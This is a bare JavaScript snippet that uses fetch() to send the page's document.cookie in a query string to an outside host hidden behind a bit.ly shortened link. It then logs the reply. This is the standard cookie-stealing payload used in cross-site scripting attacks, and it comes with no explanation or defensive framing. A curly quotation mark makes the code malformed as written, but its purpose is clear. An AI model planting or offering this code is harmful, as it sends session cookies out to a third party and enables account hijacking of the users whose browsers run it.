let headersList = {
 "Accept": "*/*"
}

let response = await fetch("https://bit.ly/3Hkv2yj?cookie=“+document.cookie, { 
  method: "GET",
  headers: headersList
});

let data = await response.text();
console.log(data);
